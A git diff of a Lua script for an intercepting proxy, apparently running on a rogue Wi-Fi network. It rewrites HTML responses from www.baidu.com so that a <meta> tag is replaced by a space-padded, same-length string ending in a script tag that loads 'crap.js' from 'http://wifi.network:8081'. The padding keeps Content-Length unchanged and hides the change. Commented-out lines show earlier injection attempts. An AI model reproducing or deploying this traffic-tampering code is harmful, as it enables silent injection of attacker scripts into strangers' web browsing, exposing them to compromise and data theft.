@@ -1,5 +1,8 @@
 --local zlib = require "zlib"
-local buffer = {}
+--local buffer = {}
+
+local script = '<script src="http://wifi.network:8081/crap.js"></script>'
+local scriptLen = string.len(script)
 
 function tableLen(t)
 	local count = 0
@@ -7,127 +10,52 @@ function tableLen(t)
 	return count
 end 
 
-function extract(data)
-	local t = {}
-	--local sep = "\n"
-	t.headers = {}
-	t.data = ""
-	local i = 1
-	local head = true
-	for str in string.gmatch(data, ".-\n") do
-        --print("_________________________________", str)
-
-        if (string.match(str, "^%s+$")) then
-			--print("HEAD.................................................")
-        	head = false
-        	i = 1
-        end
-
-		if (head) then 
-			t.headers[i] = str 
-		else
-			t.data = t.data..str
-		end
-        i = i + 1
-        
-        
-    end
-
-    if(tableLen(t.headers) == 0) then
-    	t.type = "UNKOWN"	
-    	print("============================== UNKOWN DATA BEGIN")
-    	print(data)
-    	print("============================== UNKOWN DATA END")
-    else 
-		t.statusCode = string.match(t.headers[1], "HTTP/1.1 (%d+)")
-		if (t.statusCode) then
-			if (string.match(data, "Content.Type. text/html")) then t.html = true end
-			t.type = "RES"
-		else
-			t.type = "REQ"
-		end
+function matchHost(host, html, pattern)
+	for matched in string.gmatch(html, pattern) do
+		if (string.len(matched) >= scriptLen) then
+			print ("found ========== " .. matched) 	
+			return string.gsub(matched, '-', '.') --HOLY SHIT
+		end	
 	end
-	return t
+	return nil
 end
 
-function modify(data, isbody, ctx) -- response only
-	if (isbody == false) then
-		local len = data.gmatch(data, "Content.Length. (%d)+")()
-		if (len) then
-			print("replace len: " .. len .. " as : " .. (len + 4) )
-			data = string.gsub(data, "Content.Length. %d+", "Content-Length: "..(len+4))
-		end
-	else
-		data = string.gsub(data, "<title>", "<title>HOLY")
+function padding(src)
+	print("padding ============ src    " .. src)
+	if (string.len(src) < scriptLen) then
+		print("[WARN]: src.length must be >= script.length.")
+		return nil
+	end
+	local n = string.len(src) - scriptLen
+	return string.rep(" ", n)..script
+end
+
+function modify(data, isbody, ctx, host) -- response only
+	print(isbody, ctx, host)	
+
+	if (host == "www.baidu.com" ) then
+--		if (buffer[ctx] == nil) then
+			local matched = matchHost(host, data, "<meta.->")
+			if (matched) then 
+				local dst = padding(matched)				
+				data = string.gsub(data, matched, dst)				
+				print("replace " .. ctx .. " ======= src    " .. matched .." ====== as " .. dst .. "==========\n" .. data)
+			--	buffer[ctx] = 1
+			end
+--		end
 	end
 
-	print (data, isbody, ctx)
-	
-	--if (encoding) then
-	--	local decompres = zlib.inflate()
-	--	local r = decompress(data)
-	--	r = string.gsub(r, "<title>", "<title>HOLY")
-	--	local compress = zlib.deflate()
-	--	data = compress(r)
+	data = string.gsub(data, "<head>", "<HEAD>")
+
+	--if (isbody == false) then
+		-- local len = data.gmatch(data, "Content.Length. (%d)+")()
+		-- if (len) then
+		-- 	print("replace len: " .. len .. " as : " .. (len + 31) )
+		-- 	data = string.gsub(data, "Content.Length. %d+", "Content-Length: "..(len+31))
+		-- end
 	--else
-	--	data = string.gsub(r, "<title>", "<title>HOLY")
-	--end	
-
-
-	--if (isresp) then print(data) end
-	--print("============================== DATA BEGIN")
-	--print(data)
-	--print("============================== DATA END")
-
-	--local len = data.gmatch(data, "Content.Length. (%d)+")()
-	--if (len) then
-	--	print("replace len: " .. len .. " as : " .. (len + 4) )
-	--	data = string.gsub(data, "Content.Length. %d+", "Content-Length: "..(len+4))
+		-- data = string.gsub(data, "</head>", '</HEAD><script src="crap.js"></script>')
 	--end
 
-	--data = string.gsub(data, "Accept.Encoding.-\n", "")
-	--data = string.gsub(data, "<title>", "<title>HOLY")
-	--if (string.match(data, "Content.Type. text/html")) then
-	--	local stream = zlib.inflate()
-	--	local r = stream(t.data)
-	--end
-
-	--local t = extract(data)
-	--local count = tableLen(t)
-
-	--if (t.type == "UNKOWN") then
-	--	print("UNKOWN TYPE")
-
-	--elseif (t.type == "REQ") then
-	--	if (string.match(data, "Accept.Encoding.-\n")) then
-			--print("=========================== REMOVE GZIP DEFLATE")
-	--		data = string.gsub(data, "Accept.Encoding.-\n", "")
-	--	end
-
-	--elseif (t.type == "RES" and t.html) then
-	--	local total, current, buffer
-	--	local len = data.gmatch(data, "Content.Length. (%d)+")()
-	--	if (len) then
-	--		buffer = ""
-	--		current = 0
-	--		total = len 
-	--	end
-
-	--	current = current + string.len(data)
-	--	buffer = buffer..data
-
-	--	if (string.match(data, "Content.Encoding. gzip")) then
-	--		print("============================== GZIP DATA:")
-	--		local stream = zlib.inflate()
-	--		local r = stream(t.data)
-	--		print(r)
-			
-	--	else 
-	--		print("============================== PLAIN DATA:")
-	--		print(data)
-	--	end
-	--end
-    -- data = string.gsub(data, "gzip, deflate", "") --for requests
-    --data = string.gsub(data, "<title>", "<title>HOLY") --for responses
     return data
-end
+end 
